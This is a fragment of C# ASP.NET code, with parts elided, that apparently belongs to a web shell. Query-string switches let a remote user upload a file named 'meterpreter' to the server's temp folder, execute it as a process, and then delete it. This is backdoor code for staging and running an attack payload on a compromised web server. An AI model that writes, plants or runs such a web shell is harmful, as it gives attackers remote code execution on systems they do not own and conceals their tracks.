...
if (Request.Url.Query.StartsWith("?proxy")){				//XXX:Stupid hack but works
	...
	if (Request.Url.Query.StartsWith("?file")){ 				//If url parameter file is set
		if (Request.Url.Query.StartsWith("?file&upload")){		//reads file and saves it to temp
			HttpPostedFile file = Request.Files["meterpreter"];
		...
		if (Request.Url.Query.StartsWith("?file&run")){		//Executes the file
			try
			{
				System.Diagnostics.Process process1 = new System.Diagnostics.Process();
				process1.StartInfo.FileName = (String)Session["SaveLocation"];
				process1.Start();
		...
		if (Request.Url.Query.StartsWith("?file&delete")){	//Deletes file from temp
			try
			{
				File.Delete((String)Session["SaveLocation"]);
